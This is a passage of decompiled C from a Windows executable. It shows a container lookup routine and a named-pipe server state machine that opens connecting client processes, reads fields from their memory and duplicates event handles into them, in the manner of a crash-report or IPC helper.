  int *extraout_ECX_01;
  int *extraout_ECX_02;
  int *extraout_ECX_03;
  int *piVar3;
  char cVar4;
  int **ppiVar5;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (*(int *)((int)this + 4) == 0) {
                    // WARNING: Load size is inaccurate
    FUN_0040929a(this,param_1,'\x01',*this,this,param_4);
    return param_1;
  }
                    // WARNING: Load size is inaccurate
  ppiVar2 = *this;
  ppiVar5 = param_2;
  if (param_2 == (int **)*ppiVar2) {
    uVar1 = FUN_0040ebf8(param_3,(LPCWSTR *)(param_2 + 4));
    piVar3 = extraout_ECX;
    if ((char)uVar1 == '\0') goto LAB_0040f23d;
  }
  else {
    if (param_2 == ppiVar2) {
      uVar1 = FUN_0040ebf8(ppiVar2[2] + 4,param_3);
      piVar3 = extraout_ECX_00;
      if ((char)uVar1 == '\0') goto LAB_0040f23d;
                    // WARNING: Load size is inaccurate
      cVar4 = '\0';
      param_2 = *(int ***)(*this + 8);
      goto LAB_0040f230;
    }
    uVar1 = FUN_0040ebf8(param_3,(LPCWSTR *)(param_2 + 4));
    if ((char)uVar1 != '\0') {
      local_8 = param_2;
      ppiVar2 = FUN_00409256((int **)&local_8);
      uVar1 = FUN_0040ebf8(*ppiVar2 + 4,param_3);
      if ((char)uVar1 != '\0') {
        piVar3 = local_8[2];
        if (*(char *)((int)piVar3 + 0xd) != '\0') {
          cVar4 = '\0';
          param_2 = local_8;
          goto LAB_0040f230;
        }
        goto LAB_0040f22e;
      }
    }
    uVar1 = FUN_0040ebf8(param_2 + 4,param_3);
    piVar3 = extraout_ECX_01;
    if ((char)uVar1 == '\0') {
LAB_0040f23d:
      ppiVar2 = (int **)FUN_0040f25d(this,local_10,piVar3,param_3,param_4);
      *param_1 = *ppiVar2;
      return param_1;
    }
    local_8 = param_2;
    ppiVar2 = FUN_00402ad4((int **)&local_8);
                    // WARNING: Load size is inaccurate
    piVar3 = extraout_ECX_02;
    if ((*ppiVar2 != *this) &&
       (uVar1 = FUN_0040ebf8(param_3,(LPCWSTR *)(local_8 + 4)), piVar3 = extraout_ECX_03,
       (char)uVar1 == '\0')) goto LAB_0040f23d;
    ppiVar5 = local_8;
    if (*(char *)((int)param_2[2] + 0xd) != '\0') {
      cVar4 = '\0';
      goto LAB_0040f230;
    }
  }
LAB_0040f22e:
  cVar4 = '\x01';
  param_2 = ppiVar5;
LAB_0040f230:
  FUN_0040929a(this,param_1,cVar4,param_2,piVar3,param_4);
  return param_1;
}



void __thiscall
FUN_0040f25d(void *this,undefined4 *param_1,undefined4 param_2,LPCWSTR *param_3,int **param_4)

{
  undefined4 *puVar1;
  uint uVar2;
  void *extraout_ECX;
  void *pvVar3;
  void *extraout_ECX_00;
  int **ppiVar4;
  int **ppiVar5;
  char local_c;
  int **local_8;
  
  uVar2 = 1;
  local_c = '\x01';
                    // WARNING: Load size is inaccurate
  pvVar3 = this;
  ppiVar4 = (int **)(*this)[1];
  ppiVar5 = *this;
  local_8 = (int **)this;
  while (*(char *)((int)ppiVar4 + 0xd) == '\0') {
    uVar2 = FUN_0040ebf8(param_3,(LPCWSTR *)(ppiVar4 + 4));
    local_c = (char)uVar2;
    pvVar3 = extraout_ECX;
    ppiVar5 = ppiVar4;
    if (local_c == '\0') {
      ppiVar4 = (int **)ppiVar4[2];
    }
    else {
      ppiVar4 = (int **)*ppiVar4;
    }
  }
  local_8 = ppiVar5;
  if ((char)uVar2 != '\0') {
                    // WARNING: Load size is inaccurate
    if (ppiVar5 == (int **)**this) {
      local_c = '\x01';
      goto LAB_0040f2ab;
    }
    FUN_00409256((int **)&local_8);
  }
  ppiVar4 = local_8;
  uVar2 = FUN_0040ebf8(local_8 + 4,param_3);
  pvVar3 = extraout_ECX_00;
  if ((char)uVar2 == '\0') {
    FUN_004091f8(param_4);
    *param_1 = ppiVar4;
    *(undefined *)(param_1 + 1) = 0;
    return;
  }
LAB_0040f2ab:
  puVar1 = (undefined4 *)FUN_0040929a(this,(int **)&param_4,local_c,ppiVar5,pvVar3,param_4);
  *param_1 = *puVar1;
  *(undefined *)(param_1 + 1) = 1;
  return;
}



int __fastcall FUN_0040f2ff(short *param_1,undefined2 param_2)

{
  short sVar1;
  short *psVar2;
  short *psVar3;
  short *psVar4;
  undefined6 uVar5;
  
  sVar1 = *param_1;
  psVar4 = param_1;
  psVar3 = param_1;
  while (psVar2 = psVar4, sVar1 != 0) {
    uVar5 = FUN_0041c12a(psVar3,param_2);
    param_2 = (undefined2)((uint6)uVar5 >> 0x20);
    psVar4 = psVar2 + (int)uVar5 + 1;
    psVar3 = psVar2;
    sVar1 = psVar2[(int)uVar5 + 1];
  }
  return ((int)psVar2 - (int)param_1 >> 1) + 1;
}



void * __fastcall FUN_0040f32a(void *param_1,int param_2)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = FUN_00422a6c();
  piVar2 = (int *)FUN_0040139e();
  if (iVar1 == 0) {
    CSimpleStringT__(param_1,piVar2);
  }
  else {
    FUN_00402bef(param_1,param_2,iVar1 - param_2 >> 1,piVar2);
  }
  return param_1;
}



undefined4 * __thiscall
FUN_0040f361(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 *param_7)

{
  *(undefined4 *)this = param_1;
  *(undefined4 *)((int)this + 4) = param_2;
  *(undefined4 *)((int)this + 8) = param_3;
  *(undefined4 *)((int)this + 0xc) = param_5;
  *(undefined4 *)((int)this + 0x10) = param_6;
  *(undefined4 *)((int)this + 0x14) = *param_7;
  *(undefined4 *)((int)this + 0x18) = param_7[1];
  *(undefined4 *)((int)this + 0x1c) = 0;
  *(undefined4 *)((int)this + 0x20) = param_4;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined4 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x2c) = 0;
  *(undefined4 *)((int)this + 0x30) = 0;
  *(undefined4 *)((int)this + 0x34) = 0;
  *(undefined4 *)((int)this + 0x40) = 0;
  GetSystemTimeAsFileTime((LPFILETIME)((int)this + 0x38));
  return (undefined4 *)this;
}



uint __fastcall FUN_0040f3c0(int param_1)

{
  HANDLE pvVar1;
  BOOL BVar2;
  _FILETIME local_24;
  _FILETIME local_1c;
  _FILETIME local_14;
  _FILETIME local_c;
  
  pvVar1 = OpenProcess(0x10000000,0,*(DWORD *)(param_1 + 4));
  *(HANDLE *)(param_1 + 0x24) = pvVar1;
  if (pvVar1 != (HANDLE)0x0) {
    BVar2 = GetProcessTimes(pvVar1,&local_c,&local_24,&local_1c,&local_14);
    if (BVar2 != 0) {
      *(DWORD *)(param_1 + 0x38) = local_c.dwLowDateTime;
      *(DWORD *)(param_1 + 0x3c) = local_c.dwHighDateTime;
    }
    *(undefined4 *)(param_1 + 0x40) = *(undefined4 *)(param_1 + 0x38);
    pvVar1 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCWSTR)0x0);
    *(HANDLE *)(param_1 + 0x28) = pvVar1;
    if (pvVar1 != (HANDLE)0x0) {
      pvVar1 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCWSTR)0x0);
      *(HANDLE *)(param_1 + 0x2c) = pvVar1;
      return (uint)pvVar1 & 0xffffff00 | (uint)(pvVar1 != (HANDLE)0x0);
    }
  }
  return (uint)pvVar1 & 0xffffff00;
}



void __fastcall FUN_0040f440(int param_1)

{
  if (*(int *)(param_1 + 0x30) != 0) {
    UnregisterWaitEx(*(HANDLE *)(param_1 + 0x30),(HANDLE)0xffffffff);
    *(undefined4 *)(param_1 + 0x30) = 0;
  }
  return;
}



void __thiscall FUN_0040f45a(void *this,char param_1)

{
  HANDLE WaitHandle;
  
  WaitHandle = *(HANDLE *)((int)this + 0x34);
  if (WaitHandle != (HANDLE)0x0) {
    if (param_1 == '\0') {
      UnregisterWait(WaitHandle);
    }
    else {
      UnregisterWaitEx(WaitHandle,(HANDLE)0xffffffff);
    }
    *(undefined4 *)((int)this + 0x34) = 0;
  }
  return;
}



bool __thiscall FUN_0040f488(void *this,LPVOID param_1)

{
  BOOL BVar1;
  SIZE_T local_8;
  
  local_8 = 0;
  BVar1 = ReadProcessMemory(*(HANDLE *)((int)this + 0x24),*(LPCVOID *)((int)this + 0xc),param_1,4,
                            &local_8);
  return BVar1 != 0 && local_8 == 4;
}



bool __thiscall FUN_0040f4bc(void *this,LPVOID param_1)

{
  BOOL BVar1;
  SIZE_T local_8;
  
  local_8 = 0;
  BVar1 = ReadProcessMemory(*(HANDLE *)((int)this + 0x24),*(LPCVOID *)((int)this + 0x20),param_1,4,
                            &local_8);
  return BVar1 != 0 && local_8 == 4;
}



void __fastcall FUN_0040f4f0(int param_1)

{
  int extraout_ECX;
  undefined8 uVar1;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  GetSystemTimeAsFileTime(&local_c);
  uVar1 = __aulldiv(local_c.dwLowDateTime - *(uint *)(param_1 + 0x38),
                    (local_c.dwHighDateTime - *(int *)(param_1 + 0x3c)) -
                    (uint)(local_c.dwLowDateTime < *(uint *)(param_1 + 0x38)),10,0);
  uVar1 = __aulldiv((uint)uVar1,(uint)((ulonglong)uVar1 >> 0x20),1000,0);
  FUN_00422a3b(extraout_ECX,(short)((ulonglong)uVar1 >> 0x20));
  return;
}



uint __fastcall FUN_0040f554(int param_1)

{
  uint uVar1;
  undefined2 *puVar2;
  undefined2 *puVar3;
  int iVar4;
  SIZE_T nSize;
  SIZE_T local_8;
  
  uVar1 = *(uint *)(param_1 + 0x18);
  if (uVar1 < 0x1001) {
    local_8 = 0;
    nSize = uVar1 << 8;
    if (*(int *)(param_1 + 0x1c) == 0) {
      uVar1 = uVar1 + 1;
      iVar4 = (int)((ulonglong)uVar1 * 0x100 >> 0x20);
      puVar2 = (undefined2 *)
               FUN_00423836(-(uint)(iVar4 != 0) | (uint)((ulonglong)uVar1 * 0x100),iVar4);
      puVar3 = puVar2;
      if (puVar2 == (undefined2 *)0x0) {
        puVar2 = (undefined2 *)0x0;
      }
      else {
        while (uVar1 = uVar1 - 1, -1 < (int)uVar1) {
          *puVar3 = 0;
          puVar3[0x40] = 0;
          puVar3 = puVar3 + 0x80;
        }
      }
      if (puVar2 != *(undefined2 **)(param_1 + 0x1c)) {
        FID_conflict__free(*(void **)(param_1 + 0x1c));
        *(undefined2 **)(param_1 + 0x1c) = puVar2;
      }
                    // WARNING: Subroutine does not return
      __break();
    }
    uVar1 = ReadProcessMemory(*(HANDLE *)(param_1 + 0x24),*(LPCVOID *)(param_1 + 0x14),
                              *(LPVOID *)(param_1 + 0x1c),nSize,&local_8);
    if (uVar1 != 0) {
      FUN_0040f4f0(param_1);
      return (uint)(local_8 == nSize);
    }
  }
  return uVar1 & 0xffffff00;
}



undefined4 * __fastcall FUN_0040f617(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = 0;
  return param_1;
}



undefined8 __thiscall FUN_0040f63c(void *this,void **param_1,LONG param_2)

{
  void **ppvVar1;
  uint extraout_EDX;
  undefined8 uVar2;
  undefined4 in_stack_00000018;
  undefined4 in_stack_00000028;
  void **in_stack_00000030;
  void *local_38 [6];
  void *local_20 [4];
  undefined4 local_10;
  undefined4 local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  *(undefined4 *)((int)this + 0x18) = 0;
  *(undefined4 *)((int)this + 0x1c) = 0;
  uVar2 = FUN_00410356((int *)0x0,(int *)0x0);
  *(int *)((int)this + 0x18) = (int)uVar2;
  basic_string__((void **)((int)this + 0x20),(uint)((ulonglong)uVar2 >> 0x20),param_1);
  *(LONG *)((int)this + 0x38) = param_2;
  *(undefined4 *)((int)this + 0x54) = in_stack_00000018;
  *(undefined4 *)((int)this + 0x3c) = 0;
  *(undefined4 *)((int)this + 0x40) = 0;
  *(undefined4 *)((int)this + 0x44) = 0;
  *(undefined **)((int)this + 0x48) = &LAB_0040450f;
  *(undefined4 *)((int)this + 0x4c) = 0;
  *(code **)((int)this + 0x50) = FUN_00409fbf;
  *(undefined **)((int)this + 0x58) = &LAB_0040450f;
  *(undefined4 *)((int)this + 0x5c) = 0;
  *(code **)((int)this + 0x60) = FUN_0040a689;
  *(undefined4 *)((int)this + 100) = in_stack_00000028;
  *(undefined2 *)((int)this + 0x68) = 0x100;
  if (in_stack_00000030 == (void **)0x0) {
    local_10 = 0;
    local_c = 7;
    local_20[0]._0_2_ = 0;
    FID_conflict_assign(local_20,(undefined4 *)&DAT_0042f178,(void *)0x0);
    ppvVar1 = local_20;
  }
  else {
    ppvVar1 = basic_string__(local_38,extraout_EDX,in_stack_00000030);
  }
  basic_string__((void *)((int)this + 0x6c),ppvVar1);
  if (in_stack_00000030 == (void **)0x0) {
    FUN_0040ae40(local_20,'\x01',(void *)0x0);
  }
  else {
    FUN_0040ae40(local_38,'\x01',(void *)0x0);
  }
  *(undefined4 *)((int)this + 0x84) = 0;
  *(undefined *)((int)this + 0x88) = 0;
  *(undefined4 *)((int)this + 0x8c) = 0;
  *(undefined4 *)((int)this + 0x90) = 0;
  *(undefined4 *)((int)this + 0x94) = 0;
  *(undefined4 *)((int)this + 0x98) = 0;
  *(undefined4 *)((int)this + 0x9c) = 0;
  FUN_0040f617((undefined4 *)((int)this + 0xa0));
  *(undefined4 *)((int)this + 0xcc) = 0;
  InitializeCriticalSection((LPCRITICAL_SECTION)this);
  uVar2 = FUN_0041a954();
  return uVar2;
}



void __fastcall FUN_0040f774(LPCRITICAL_SECTION param_1)

{
  _LIST_ENTRY *this;
  int iVar1;
  PRTL_CRITICAL_SECTION_DEBUG p_Var2;
  
  EnterCriticalSection(param_1);
  *(undefined *)&param_1[5].LockSemaphore = 1;
  LeaveCriticalSection(param_1);
  DisconnectNamedPipe(param_1[2].OwningThread);
  iVar1 = 100;
  do {
    iVar1 = iVar1 + -1;
    if (param_1[5].OwningThread == (HANDLE)0x1) break;
    Sleep(10);
  } while (iVar1 != 0);
  if (param_1[2].LockSemaphore != (HANDLE)0x0) {
    UnregisterWaitEx(param_1[2].LockSemaphore,(HANDLE)0xffffffff);
  }
  if (param_1[2].OwningThread != (HANDLE)0x0) {
    CloseHandle(param_1[2].OwningThread);
  }
  p_Var2 = *(PRTL_CRITICAL_SECTION_DEBUG *)param_1[1].DebugInfo;
  if (p_Var2 != param_1[1].DebugInfo) {
    do {
      this = (p_Var2->ProcessLocksList).Flink;
      FUN_0040f45a(this,'\x01');
      FUN_0040f440((int)this);
      if (this != (_LIST_ENTRY *)0x0) {
        FUN_0040ad35(this);
      }
      p_Var2 = *(PRTL_CRITICAL_SECTION_DEBUG *)p_Var2;
    } while (p_Var2 != param_1[1].DebugInfo);
  }
  if (param_1[2].SpinCount != 0) {
    ReleaseMutex((HANDLE)param_1[2].SpinCount);
    CloseHandle((HANDLE)param_1[2].SpinCount);
  }
  if (param_1[6].OwningThread != (HANDLE)0x0) {
    CloseHandle(param_1[6].OwningThread);
  }
  DeleteCriticalSection(param_1);
  FUN_0040ae40(&param_1[4].OwningThread,'\x01',(void *)0x0);
  FUN_0040ae40(&param_1[1].RecursionCount,'\x01',(void *)0x0);
  FUN_0041029f((int **)(param_1 + 1));
  return;
}



uint __fastcall FUN_0040f85b(PVOID param_1)

{
  uint in_EAX;
  uint uVar1;
  HANDLE hObject;
  undefined4 *lpName;
  
  if (*(int *)((int)param_1 + 0x84) == 0) {
    *(undefined4 *)((int)param_1 + 0x84) = 2;
    hObject = CreateMutexW((LPSECURITY_ATTRIBUTES)0x0,1,(LPCWSTR)0x0);
    *(HANDLE *)((int)param_1 + 0x44) = hObject;
    if (hObject != (HANDLE)0x0) {
      hObject = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCWSTR)0x0);
      *(HANDLE *)((int)param_1 + 0x9c) = hObject;
      if ((hObject != (HANDLE)0x0) &&
         (hObject = (HANDLE)RegisterWaitForSingleObject
                                      ((PHANDLE)((int)param_1 + 0x40),hObject,FUN_0040fff2,param_1,
                                       0xffffffff,4), hObject != (HANDLE)0x0)) {
        lpName = (undefined4 *)((int)param_1 + 0x20);
        if (7 < *(uint *)((int)param_1 + 0x34)) {
          lpName = (undefined4 *)*lpName;
        }
        hObject = CreateNamedPipeW((LPCWSTR)lpName,0x40080003,6,1,0x40,0x40,0,
                                   *(LPSECURITY_ATTRIBUTES *)((int)param_1 + 0x38));
        *(HANDLE *)((int)param_1 + 0x3c) = hObject;
        if (hObject != (HANDLE)0xffffffff) {
          hObject = (HANDLE)SetEvent(*(HANDLE *)((int)param_1 + 0x9c));
          if (hObject != (HANDLE)0x0) {
            return (uint)hObject & 0xffffff00 | 1;
          }
          *(undefined4 *)((int)param_1 + 0x84) = 1;
        }
      }
    }
    uVar1 = (uint)hObject & 0xffffff00;
  }
  else {
    uVar1 = in_EAX & 0xffffff00;
  }
  return uVar1;
}



void __fastcall FUN_0040f905(int param_1)

{
  if (*(char *)(param_1 + 0x88) == '\0') {
    if (*(int *)(param_1 + 0x40) != 0) {
      UnregisterWait(*(HANDLE *)(param_1 + 0x40));
      *(undefined4 *)(param_1 + 0x40) = 0;
    }
    if (*(int *)(param_1 + 0x3c) != 0) {
      CloseHandle(*(HANDLE *)(param_1 + 0x3c));
      *(undefined4 *)(param_1 + 0x3c) = 0;
    }
    if (*(HANDLE *)(param_1 + 0x9c) != (HANDLE)0x0) {
      CloseHandle(*(HANDLE *)(param_1 + 0x9c));
      *(undefined4 *)(param_1 + 0x9c) = 0;
    }
  }
  return;
}



void __fastcall FUN_0040f951(void *param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  
  BVar1 = ResetEvent(*(HANDLE *)((int)param_1 + 0x9c));
  if (BVar1 != 0) {
    BVar1 = ConnectNamedPipe(*(HANDLE *)((int)param_1 + 0x3c),(LPOVERLAPPED)((int)param_1 + 0x8c));
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x217) {
        FUN_0040fca2(param_1,4);
        return;
      }
      if (DVar2 == 0x3e5) {
        *(undefined4 *)((int)param_1 + 0x84) = 3;
        return;
      }
    }
  }
  FUN_0040fc87((int)param_1);
  return;
}



void __fastcall FUN_0040f9ab(void *param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined4 uVar3;
  DWORD local_8;
  
  local_8 = 0;
  BVar1 = GetOverlappedResult(*(HANDLE *)((int)param_1 + 0x3c),(LPOVERLAPPED)((int)param_1 + 0x8c),
                              &local_8,0);
  if ((BVar1 != 0) || (DVar2 = GetLastError(), BVar1 != 0)) {
    uVar3 = 4;
  }
  else {
    if (DVar2 == 0x3e4) {
      return;
    }
    uVar3 = 10;
  }
  FUN_0040fca2(param_1,uVar3);
  return;
}



// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_0040f9ff(void *param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  DWORD local_c;
  undefined4 uStack8;
  
  local_c = 0;
  uStack8 = param_1;
  FUN_00416e80((uint *)((int)param_1 + 0xa0),0,0x2c);
  BVar1 = ReadFile(*(HANDLE *)((int)param_1 + 0x3c),(uint *)((int)param_1 + 0xa0),0x2c,&local_c,
                   (LPOVERLAPPED)((int)param_1 + 0x8c));
  uStack8 = (void *)((uint)uStack8 & 0xffffff | (uint)(BVar1 != 0) << 0x18);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    if ((uStack8._3_1_ == '\0') && (DVar2 != 0x3e5)) {
      FUN_0040fca2(param_1,10);
      return;
    }
  }
  *(undefined4 *)((int)param_1 + 0x84) = 5;
  return;
}



void __fastcall FUN_0040fa76(void *param_1)

{
  void *this;
  uint uVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  puVar2 = (undefined4 *)0x0;
  if (*(int *)((int)param_1 + 0xa0) == 4) {
    if (*(code **)((int)param_1 + 0x60) != (code *)0x0) {
      (**(code **)((int)param_1 + 0x60))
                (*(undefined4 *)((int)param_1 + 100),*(undefined4 *)((int)param_1 + 0xa4));
    }
  }
  else if ((((*(int *)((int)param_1 + 0xa0) == 1) && (*(int *)((int)param_1 + 0xa4) != 0)) &&
           (*(int *)((int)param_1 + 0xac) != 0)) &&
          ((*(int *)((int)param_1 + 0xb0) != 0 && (*(int *)((int)param_1 + 0xb4) != 0)))) {
    this = (void *)FUN_00416f82(0x44);
    if (this != (void *)0x0) {
      puVar2 = FUN_0040f361(this,param_1,*(undefined4 *)((int)param_1 + 0xa4),
                            *(undefined4 *)((int)param_1 + 0xa8),
                            *(undefined4 *)((int)param_1 + 0xac),
                            *(undefined4 *)((int)param_1 + 0xb0),
                            *(undefined4 *)((int)param_1 + 0xb4),(undefined4 *)((int)param_1 + 0xb8)
                           );
    }
    uVar1 = FUN_0040f3c0((int)puVar2);
    if (((char)uVar1 == '\0') || (uVar1 = FUN_0040fdd8(param_1,puVar2), (char)uVar1 == '\0')) {
      FUN_0040fca2(param_1,10);
      puVar3 = puVar2;
    }
    else {
      puVar3 = (undefined4 *)0x0;
      *(undefined4 **)((int)param_1 + 0xcc) = puVar2;
      *(undefined4 *)((int)param_1 + 0x84) = 7;
    }
    if (puVar3 == (undefined4 *)0x0) {
      return;
    }
    FUN_0040ad35(puVar3);
    return;
  }
  FUN_0040fca2(param_1,10);
  return;
}



void __fastcall FUN_0040fb57(void *param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined4 uVar3;
  DWORD local_8;
  
  local_8 = 0;
  BVar1 = ReadFile(*(HANDLE *)((int)param_1 + 0x3c),(LPVOID)((int)param_1 + 0xa0),0x2c,&local_8,
                   (LPOVERLAPPED)((int)param_1 + 0x8c));
  if ((BVar1 != 0) || (DVar2 = GetLastError(), BVar1 != 0)) {
    uVar3 = 9;
  }
  else {
    if (DVar2 == 0x3e5) {
      *(undefined4 *)((int)param_1 + 0x84) = 9;
      return;
    }
    uVar3 = 10;
  }
  FUN_0040fca2(param_1,uVar3);
  return;
}



void __fastcall FUN_0040fbbf(LPCRITICAL_SECTION param_1)

{
  PRTL_CRITICAL_SECTION_DEBUG p_Var1;
  BOOL BVar2;
  PRTL_CRITICAL_SECTION_DEBUG p_Var3;
  DWORD local_8;
  
  local_8 = 0;
  BVar2 = GetOverlappedResult(param_1[2].OwningThread,(LPOVERLAPPED)&param_1[5].SpinCount,&local_8,0
                             );
  if ((BVar2 != 0) && (param_1[3].DebugInfo != (PRTL_CRITICAL_SECTION_DEBUG)0x0)) {
    EnterCriticalSection(param_1);
    p_Var1 = param_1[1].DebugInfo;
    p_Var3 = *(PRTL_CRITICAL_SECTION_DEBUG *)p_Var1;
    if (p_Var3 != p_Var1) {
      do {
        if ((_LIST_ENTRY *)param_1[8].OwningThread == (p_Var3->ProcessLocksList).Flink) {
          (*(code *)param_1[3].DebugInfo)
                    (param_1[3].LockCount,(_LIST_ENTRY *)param_1[8].OwningThread);
          break;
        }
        p_Var3 = *(PRTL_CRITICAL_SECTION_DEBUG *)p_Var3;
      } while (p_Var3 != p_Var1);
    }
    LeaveCriticalSection(param_1);
  }
  FUN_0040fca2(param_1,10);
  return;
}



void __fastcall FUN_0040fc2b(void *param_1)

{
  BOOL BVar1;
  
  *(undefined4 *)((int)param_1 + 0xcc) = 0;
  *(undefined4 *)((int)param_1 + 0x8c) = 0;
  *(undefined4 *)((int)param_1 + 0x90) = 0;
  *(undefined4 *)((int)param_1 + 0x98) = 0;
  *(undefined4 *)((int)param_1 + 0x94) = 0;
  BVar1 = ResetEvent(*(HANDLE *)((int)param_1 + 0x9c));
  if (BVar1 != 0) {
    BVar1 = DisconnectNamedPipe(*(HANDLE *)((int)param_1 + 0x3c));
    if (BVar1 != 0) {
      if (*(char *)((int)param_1 + 0x88) == '\0') {
        FUN_0040fca2(param_1,2);
      }
      return;
    }
  }
  FUN_0040fc87((int)param_1);
  return;
}



void __fastcall FUN_0040fc87(int param_1)

{
  SetEvent(*(HANDLE *)(param_1 + 0x9c));
  *(undefined4 *)(param_1 + 0x84) = 1;
  return;
}



void __thiscall FUN_0040fca2(void *this,undefined4 param_1)

{
  BOOL BVar1;
  
  *(undefined4 *)((int)this + 0x84) = param_1;
  BVar1 = SetEvent(*(HANDLE *)((int)this + 0x9c));
  if (BVar1 == 0) {
    *(undefined4 *)((int)this + 0x84) = 1;
  }
  return;
}



uint __thiscall FUN_0040fcd0(void *this,int param_1,undefined4 *param_2)

{
  DWORD DVar1;
  uint uVar2;
  
  *param_2 = 2;
  DVar1 = GetCurrentProcessId();
  param_2[1] = DVar1;
  uVar2 = FUN_0040fd58(this,param_1,(int)param_2);
  if ((char)uVar2 == '\0') {
    if (param_2[8] != 0) {
      DuplicateHandle(*(HANDLE *)(param_1 + 0x24),(HANDLE)param_2[8],(HANDLE)0x0,(LPHANDLE)0x0,0,0,1
                     );
      param_2[8] = 0;
    }
    if (param_2[9] != 0) {
      DuplicateHandle(*(HANDLE *)(param_1 + 0x24),(HANDLE)param_2[9],(HANDLE)0x0,(LPHANDLE)0x0,0,0,1
                     );
      param_2[9] = 0;
    }
    uVar2 = 0;
    if (param_2[10] != 0) {
      uVar2 = DuplicateHandle(*(HANDLE *)(param_1 + 0x24),(HANDLE)param_2[10],(HANDLE)0x0,
                              (LPHANDLE)0x0,0,0,1);
      param_2[10] = 0;
    }
    uVar2 = uVar2 & 0xffffff00;
  }
  else {
    uVar2 = CONCAT31((int3)(uVar2 >> 8),1);
  }
  return uVar2;
}



uint __thiscall FUN_0040fd58(void *this,int param_1,int param_2)

{
  HANDLE hSourceProcessHandle;
  uint uVar1;
  
  hSourceProcessHandle = GetCurrentProcess();
  uVar1 = DuplicateHandle(hSourceProcessHandle,*(HANDLE *)(param_1 + 0x28),
                          *(HANDLE *)(param_1 + 0x24),(LPHANDLE)(param_2 + 0x20),2,0,0);
  if ((uVar1 != 0) &&
     (uVar1 = DuplicateHandle(hSourceProcessHandle,*(HANDLE *)(param_1 + 0x2c),
                              *(HANDLE *)(param_1 + 0x24),(LPHANDLE)(param_2 + 0x24),0x100002,0,0),
     uVar1 != 0)) {
    uVar1 = DuplicateHandle(hSourceProcessHandle,*(HANDLE *)((int)this + 0x44),
                            *(HANDLE *)(param_1 + 0x24),(LPHANDLE)(param_2 + 0x28),0x100000,0,0);
    return uVar1 & 0xffffff00 | (uint)(uVar1 != 0);
  }
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040fdd8(void *this,PVOID param_1)

{
  uint uVar1;
  BOOL BVar2;
  DWORD DVar3;
  undefined4 local_34 [11];
  DWORD local_8;
  
  FUN_0040f617(local_34);
  uVar1 = FUN_0040fcd0(this,(int)param_1,local_34);
  if ((char)uVar1 != '\0') {
    local_8 = 0;
    BVar2 = WriteFile(*(HANDLE *)((int)this + 0x3c),local_34,0x2c,&local_8,
                      (LPOVERLAPPED)((int)this + 0x8c));
    if (((BVar2 != 0) || (DVar3 = GetLastError(), BVar2 != 0)) || (DVar3 == 0x3e5)) {
      uVar1 = FUN_0040ff68(this,param_1);
    }
    else {
      uVar1 = DVar3 & 0xffffff00;
    }
  }
  return uVar1;
}



void __fastcall FUN_0040fe50(LPCRITICAL_SECTION param_1)

{
  BOOL BVar1;
  undefined4 uVar2;
  LPCRITICAL_SECTION local_8;
  
  local_8 = param_1;
  if (*(char *)&param_1[5].LockSemaphore != '\0') {
    param_1[5].OwningThread = (HANDLE)0x1;
    ResetEvent(param_1[6].OwningThread);
    return;
  }
  switch(param_1[5].OwningThread) {
  case (HANDLE)0x1:
    FUN_0040f905((int)param_1);
    break;
  case (HANDLE)0x2:
    FUN_0040f951(param_1);
    break;
  case (HANDLE)0x3:
    FUN_0040f9ab(param_1);
    break;
  case (HANDLE)0x4:
    FUN_0040f9ff(param_1);
    break;
  case (HANDLE)0x5:
    local_8 = (LPCRITICAL_SECTION)0x0;
    BVar1 = GetOverlappedResult(param_1[2].OwningThread,(LPOVERLAPPED)&param_1[5].SpinCount,
                                (LPDWORD)&local_8,0);
    if ((BVar1 == 0) || (local_8 != (LPCRITICAL_SECTION)0x2c)) {
      uVar2 = 10;
    }
    else {
      uVar2 = 6;
    }
    goto LAB_0040fee6;
  case (HANDLE)0x6:
    FUN_0040fa76(param_1);
    break;
  case (HANDLE)0x7:
    local_8 = (LPCRITICAL_SECTION)0x0;
    BVar1 = GetOverlappedResult(param_1[2].OwningThread,(LPOVERLAPPED)&param_1[5].SpinCount,
                                (LPDWORD)&local_8,0);
    if (BVar1 == 0) {
      uVar2 = 10;
    }
    else {
      uVar2 = 8;
    }
LAB_0040fee6:
    FUN_0040fca2(param_1,uVar2);
    break;
  case (HANDLE)0x8:
    FUN_0040fb57(param_1);
    break;
  case (HANDLE)0x9:
    FUN_0040fbbf(param_1);
    break;
  case (HANDLE)0xa:
    FUN_0040fc2b(param_1);
    break;
  default:
    param_1[5].OwningThread = (HANDLE)0x1;
  }
  return;
}



uint __thiscall FUN_0040ff68(void *this,PVOID param_1)

{
  PVOID Context;
  uint uVar1;
  uint extraout_EAX;
  bool bVar2;
  void *local_c;
  HANDLE local_8;
  
  Context = param_1;
  local_8 = (HANDLE)0x0;
  local_c = this;
  uVar1 = RegisterWaitForSingleObject
                    (&local_8,*(HANDLE *)((int)param_1 + 0x28),FUN_00410001,param_1,0xffffffff,0x14)
  ;
  if (uVar1 != 0) {
    *(HANDLE *)((int)Context + 0x30) = local_8;
    local_c = (HANDLE)0x0;
    uVar1 = RegisterWaitForSingleObject
